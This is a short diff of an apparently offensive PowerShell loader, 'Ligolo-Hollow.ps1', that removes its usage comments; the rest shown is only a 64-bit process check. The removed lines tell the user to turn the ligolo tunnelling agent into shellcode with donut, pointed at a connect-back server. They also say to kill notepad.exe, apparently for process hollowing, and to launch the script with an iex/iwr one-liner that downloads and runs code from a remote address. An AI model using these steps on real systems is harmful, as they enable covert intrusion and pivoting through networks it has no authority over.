@@ -1,8 +1,3 @@
-#1 Make sure to convert agent.exe of ligolo to shellcode: donut -f 1 -o agent.bin -a 2 -p "-connect your-server:11601 -ignore-cert" -i agent.exe
-#2 Make sure you are running as x64 bit process before running.
-#3 Run before invoke: taskkill /F /IM:notepad.exe 
-#4 Invoke it: iex(iwr http://192.168.45.173:443/Ligolo-Hollow.ps1 -UseBasicParsing)
-
 # Check that we are running as 64bit process
 if ([System.IntPtr]::Size -ne 8) {
     Write-Error "This script must be run as a 64-bit process."
